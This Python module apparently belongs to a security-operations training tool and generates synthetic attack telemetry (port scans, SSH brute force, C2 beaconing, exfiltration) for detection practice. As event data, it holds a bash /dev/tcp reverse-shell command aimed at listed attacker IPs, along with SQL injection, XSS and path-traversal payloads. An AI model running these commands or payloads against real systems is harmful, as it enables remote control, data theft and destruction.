"""Attack Simulation Engine: generates synthetic telemetry data."""
import uuid
import random
import asyncio
import logging
from datetime import datetime, timedelta
from typing import List, Dict, Optional
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.event import Event
from app.services.mitre_mapper import map_event_to_mitre

logger = logging.getLogger("socforge.simulation")

# Simulation state tracking
_active_simulations: Dict[str, dict] = {}

# Realistic network ranges
INTERNAL_IPS = [f"10.0.1.{i}" for i in range(10, 60)]
EXTERNAL_IPS = [f"203.0.113.{i}" for i in range(1, 20)] + [f"198.51.100.{i}" for i in range(1, 10)]
ATTACKER_IPS = ["45.33.32.156", "185.220.101.42", "91.219.236.222", "192.241.193.115"]
C2_SERVERS = ["198.51.100.50", "203.0.113.99", "91.219.236.200"]
COMMON_PORTS = [22, 80, 443, 8080, 3306, 5432, 6379, 8443, 9200]
UNCOMMON_PORTS = [4444, 5555, 1337, 31337, 9001, 8888, 6667, 12345]
USERNAMES = ["admin", "root", "user", "deploy", "jenkins", "postgres", "www-data"]
HOSTNAMES = [f"web-srv-{i}" for i in range(1, 5)] + [f"db-srv-{i}" for i in range(1, 3)] + ["jump-host", "bastion-01"]

# Benign traffic templates
BENIGN_EVENT_TYPES = [
    ("http_request", "allowed", "info"),
    ("dns_query", "success", "info"),
    ("ssh_login_success", "success", "info"),
    ("file_access", "allowed", "info"),
    ("process_execution", "success", "info"),
]


def _random_ts(base: datetime, offset_seconds: int) -> datetime:
    return base + timedelta(seconds=random.randint(0, offset_seconds))


async def run_simulation(
    db: AsyncSession,
    scenario: str,
    intensity: str,
    duration_seconds: int,
    target_network: str,
    include_benign: bool,
) -> dict:
    """Run an attack simulation and generate synthetic events."""
    sim_id = uuid.uuid4()
    base_time = datetime.utcnow()
    events: List[Event] = []

    _active_simulations[str(sim_id)] = {
        "status": "running",
        "scenario": scenario,
        "started_at": base_time,
        "events_generated": 0,
        "alerts_triggered": 0,
    }

    intensity_multiplier = {"low": 1, "medium": 2, "high": 4}.get(intensity, 2)

    try:
        # Generate benign traffic first (background noise)
        if include_benign:
            benign_events = _generate_benign_traffic(sim_id, base_time, duration_seconds, intensity_multiplier * 5)
            events.extend(benign_events)

        # Generate attack traffic based on scenario
        if scenario == "full_attack_chain":
            events.extend(_scenario_full_attack_chain(sim_id, base_time, duration_seconds, intensity_multiplier))
        elif scenario == "ssh_brute_force":
            events.extend(_scenario_ssh_brute_force(sim_id, base_time, duration_seconds, intensity_multiplier))
        elif scenario == "port_scan":
            events.extend(_scenario_port_scan(sim_id, base_time, duration_seconds, intensity_multiplier))
        elif scenario == "web_attack":
            events.extend(_scenario_web_attack(sim_id, base_time, duration_seconds, intensity_multiplier))
        elif scenario == "lateral_movement":
            events.extend(_scenario_lateral_movement(sim_id, base_time, duration_seconds, intensity_multiplier))
        else:
            events.extend(_scenario_full_attack_chain(sim_id, base_time, duration_seconds, intensity_multiplier))

        # Sort by timestamp and insert
        events.sort(key=lambda e: e.timestamp)
        for event in events:
            db.add(event)
        await db.commit()

        _active_simulations[str(sim_id)]["status"] = "completed"
        _active_simulations[str(sim_id)]["events_generated"] = len(events)

    except Exception as e:
        _active_simulations[str(sim_id)]["status"] = "failed"
        logger.error(f"Simulation {sim_id} failed: {e}")
        raise

    return {
        "simulation_id": str(sim_id),
        "status": "completed",
        "scenario": scenario,
        "events_generated": len(events),
        "started_at": base_time.isoformat(),
    }


def _generate_benign_traffic(sim_id, base_time, duration, count) -> List[Event]:
    """Generate realistic benign network traffic."""
    events = []
    for _ in range(count):
        event_type, action, severity = random.choice(BENIGN_EVENT_TYPES)
        src = random.choice(INTERNAL_IPS)
        dst = random.choice(INTERNAL_IPS + EXTERNAL_IPS)
        mitre = map_event_to_mitre(event_type)
        events.append(Event(
            timestamp=_random_ts(base_time, duration),
            event_type=event_type,
            severity=severity,
            source_ip=src,
            source_port=random.randint(30000, 65535),
            dest_ip=dst,
            dest_port=random.choice(COMMON_PORTS),
            protocol=random.choice(["TCP", "UDP", "HTTP", "HTTPS"]),
            action=action,
            hostname=random.choice(HOSTNAMES),
            user_account=random.choice(USERNAMES),
            normalized_message=f"Benign {event_type} from {src} to {dst}",
            simulation_id=sim_id,
        ))
    return events


def _scenario_full_attack_chain(sim_id, base_time, duration, multiplier) -> List[Event]:
    """Full attack lifecycle: Recon → Brute Force → Reverse Shell → C2 → Lateral → Exfil."""
    events = []
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS[:5])
    c2 = random.choice(C2_SERVERS)
    phase_duration = duration // 6

    # Phase 1: Reconnaissance (Port Scanning)
    for i in range(25 * multiplier):
        port = random.choice(COMMON_PORTS + UNCOMMON_PORTS + list(range(1, 1024)))
        mitre = map_event_to_mitre("port_scan")
        events.append(Event(
            timestamp=_random_ts(base_time, phase_duration),
            event_type="port_scan",
            severity="low",
            source_ip=attacker,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=port,
            protocol="TCP",
            action="blocked" if random.random() > 0.7 else "allowed",
            normalized_message=f"Port scan: {attacker} → {target}:{port}",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=3.0,
            simulation_id=sim_id,
        ))

    # Phase 2: SSH Brute Force
    phase2_start = base_time + timedelta(seconds=phase_duration)
    for i in range(8 * multiplier):
        mitre = map_event_to_mitre("ssh_login_failed")
        events.append(Event(
            timestamp=_random_ts(phase2_start, phase_duration),
            event_type="ssh_login_failed",
            severity="medium",
            source_ip=attacker,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=22,
            protocol="TCP",
            action="failed",
            user_account=random.choice(USERNAMES),
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"Failed SSH login attempt from {attacker} to {target}",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=6.0,
            simulation_id=sim_id,
        ))

    # Successful SSH login
    mitre = map_event_to_mitre("ssh_login_success")
    events.append(Event(
        timestamp=phase2_start + timedelta(seconds=phase_duration - 2),
        event_type="ssh_login_success",
        severity="medium",
        source_ip=attacker,
        dest_ip=target,
        dest_port=22,
        protocol="TCP",
        action="success",
        user_account="root",
        hostname=random.choice(HOSTNAMES),
        normalized_message=f"Successful SSH login from {attacker} as root",
        mitre_tactic=mitre["tactic"],
        mitre_technique=mitre["technique"],
        mitre_technique_id=mitre["technique_id"],
        risk_score=8.0,
        simulation_id=sim_id,
    ))

    # Phase 3: Reverse Shell Establishment
    phase3_start = base_time + timedelta(seconds=phase_duration * 2)
    shell_port = random.choice(UNCOMMON_PORTS)
    mitre = map_event_to_mitre("reverse_shell")
    events.append(Event(
        timestamp=_random_ts(phase3_start, phase_duration // 2),
        event_type="reverse_shell",
        severity="critical",
        source_ip=target,
        source_port=random.randint(40000, 65535),
        dest_ip=attacker,
        dest_port=shell_port,
        protocol="TCP",
        action="established",
        process_name="/bin/bash",
        command_line=f"bash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1",
        hostname=random.choice(HOSTNAMES),
        normalized_message=f"Reverse shell established from {target} to {attacker}:{shell_port}",
        mitre_tactic=mitre["tactic"],
        mitre_technique=mitre["technique"],
        mitre_technique_id=mitre["technique_id"],
        risk_score=9.5,
        simulation_id=sim_id,
    ))

    # Phase 4: C2 Beaconing
    phase4_start = base_time + timedelta(seconds=phase_duration * 3)
    beacon_interval = random.randint(15, 45)
    for i in range(6 * multiplier):
        jitter = random.uniform(-0.2, 0.2) * beacon_interval
        mitre = map_event_to_mitre("c2_beacon")
        events.append(Event(
            timestamp=phase4_start + timedelta(seconds=i * beacon_interval + jitter),
            event_type="c2_beacon",
            severity="high",
            source_ip=target,
            source_port=random.randint(40000, 65535),
            dest_ip=c2,
            dest_port=443,
            protocol="HTTPS",
            action="allowed",
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"C2 beacon: {target} → {c2}:443 (interval ~{beacon_interval}s)",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=8.0,
            extra_data={"beacon_interval": beacon_interval, "jitter": round(jitter, 2)},
            simulation_id=sim_id,
        ))

    # Phase 5: Lateral Movement
    phase5_start = base_time + timedelta(seconds=phase_duration * 4)
    lateral_targets = random.sample(INTERNAL_IPS[5:15], min(3, multiplier + 1))
    for lt in lateral_targets:
        mitre = map_event_to_mitre("lateral_movement")
        events.append(Event(
            timestamp=_random_ts(phase5_start, phase_duration),
            event_type="lateral_movement",
            severity="high",
            source_ip=target,
            source_port=random.randint(40000, 65535),
            dest_ip=lt,
            dest_port=22,
            protocol="TCP",
            action="success",
            user_account="root",
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"Lateral movement: {target} → {lt} via SSH",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=8.5,
            simulation_id=sim_id,
        ))

    # Phase 6: Data Exfiltration
    phase6_start = base_time + timedelta(seconds=phase_duration * 5)
    mitre = map_event_to_mitre("data_exfiltration")
    for i in range(3 * multiplier):
        events.append(Event(
            timestamp=_random_ts(phase6_start, phase_duration),
            event_type="data_exfiltration",
            severity="critical",
            source_ip=target,
            source_port=random.randint(40000, 65535),
            dest_ip=c2,
            dest_port=443,
            protocol="HTTPS",
            action="allowed",
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"Suspicious data transfer: {target} → {c2} ({random.randint(5, 500)}MB)",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=9.0,
            extra_data={"bytes_transferred": random.randint(5_000_000, 500_000_000)},
            simulation_id=sim_id,
        ))

    return events


def _scenario_ssh_brute_force(sim_id, base_time, duration, multiplier) -> List[Event]:
    """SSH brute force scenario."""
    events = []
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS[:5])

    for i in range(15 * multiplier):
        mitre = map_event_to_mitre("ssh_login_failed")
        events.append(Event(
            timestamp=_random_ts(base_time, min(duration, 60)),
            event_type="ssh_login_failed",
            severity="medium",
            source_ip=attacker,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=22,
            protocol="TCP",
            action="failed",
            user_account=random.choice(USERNAMES),
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"Failed SSH: {attacker} → {target}:22",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=6.0,
            simulation_id=sim_id,
        ))
    return events


def _scenario_port_scan(sim_id, base_time, duration, multiplier) -> List[Event]:
    """Port scan scenario."""
    events = []
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS[:5])

    for i in range(30 * multiplier):
        port = random.randint(1, 65535)
        mitre = map_event_to_mitre("port_scan")
        events.append(Event(
            timestamp=_random_ts(base_time, min(duration, 30)),
            event_type="port_scan",
            severity="low",
            source_ip=attacker,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=port,
            protocol="TCP",
            action="blocked" if random.random() > 0.6 else "allowed",
            normalized_message=f"Port scan: {attacker} → {target}:{port}",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=3.0,
            simulation_id=sim_id,
        ))
    return events


def _scenario_web_attack(sim_id, base_time, duration, multiplier) -> List[Event]:
    """Web attack scenario (SQLi, XSS, path traversal)."""
    events = []
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS[:3])

    payloads = [
        ("sql_injection", "' OR 1=1 --", "GET /login?user=' OR 1=1 --"),
        ("sql_injection", "'; DROP TABLE users; --", "POST /api/search body={\"q\": \"'; DROP TABLE users; --\"}"),
        ("xss_attempt", "<script>alert('xss')</script>", "GET /search?q=<script>alert('xss')</script>"),
        ("path_traversal", "../../etc/passwd", "GET /files?path=../../etc/passwd"),
        ("web_exploit", "eval(base64_decode(...))", "POST /upload with eval() in body"),
    ]

    for i in range(6 * multiplier):
        event_type, payload, raw = random.choice(payloads)
        mitre = map_event_to_mitre(event_type)
        events.append(Event(
            timestamp=_random_ts(base_time, duration),
            event_type="web_exploit",
            severity="high",
            source_ip=attacker,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=random.choice([80, 443, 8080]),
            protocol="HTTP",
            action="blocked" if random.random() > 0.5 else "allowed",
            raw_log=raw,
            normalized_message=f"Web attack ({event_type}): {attacker} → {target}",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=7.5,
            extra_data={"payload": payload, "attack_type": event_type},
            simulation_id=sim_id,
        ))
    return events


def _scenario_lateral_movement(sim_id, base_time, duration, multiplier) -> List[Event]:
    """Lateral movement scenario."""
    events = []
    compromised = random.choice(INTERNAL_IPS[:5])
    targets = random.sample(INTERNAL_IPS[5:20], min(5, multiplier + 2))

    for target in targets:
        mitre = map_event_to_mitre("lateral_movement")
        events.append(Event(
            timestamp=_random_ts(base_time, duration),
            event_type="lateral_movement",
            severity="high",
            source_ip=compromised,
            source_port=random.randint(40000, 65535),
            dest_ip=target,
            dest_port=random.choice([22, 3389, 5985]),
            protocol="TCP",
            action="success",
            user_account="root",
            hostname=random.choice(HOSTNAMES),
            normalized_message=f"Lateral: {compromised} → {target}",
            mitre_tactic=mitre["tactic"],
            mitre_technique=mitre["technique"],
            mitre_technique_id=mitre["technique_id"],
            risk_score=8.0,
            simulation_id=sim_id,
        ))
    return events


def get_simulation_status(sim_id: str) -> Optional[dict]:
    return _active_simulations.get(sim_id)


def get_available_scenarios() -> list:
    return [
        {
            "id": "full_attack_chain",
            "name": "Full Attack Chain",
            "description": "Complete kill chain: Recon → Brute Force → Reverse Shell → C2 → Lateral Movement → Exfiltration",
            "phases": ["Reconnaissance", "Initial Access", "Execution", "C2", "Lateral Movement", "Exfiltration"],
            "estimated_events": "80-200",
            "severity": "critical",
        },
        {
            "id": "ssh_brute_force",
            "name": "SSH Brute Force",
            "description": "Multiple failed SSH login attempts from a single attacker IP",
            "phases": ["Credential Access"],
            "estimated_events": "15-60",
            "severity": "high",
        },
        {
            "id": "port_scan",
            "name": "Port Scan",
            "description": "Network reconnaissance via port scanning activity",
            "phases": ["Reconnaissance"],
            "estimated_events": "30-120",
            "severity": "medium",
        },
        {
            "id": "web_attack",
            "name": "Web Application Attack",
            "description": "SQL injection, XSS, and path traversal attempts",
            "phases": ["Initial Access"],
            "estimated_events": "12-50",
            "severity": "high",
        },
        {
            "id": "lateral_movement",
            "name": "Lateral Movement",
            "description": "Internal pivoting from compromised host to other systems",
            "phases": ["Lateral Movement", "Discovery"],
            "estimated_events": "5-20",
            "severity": "high",
        },
    ]
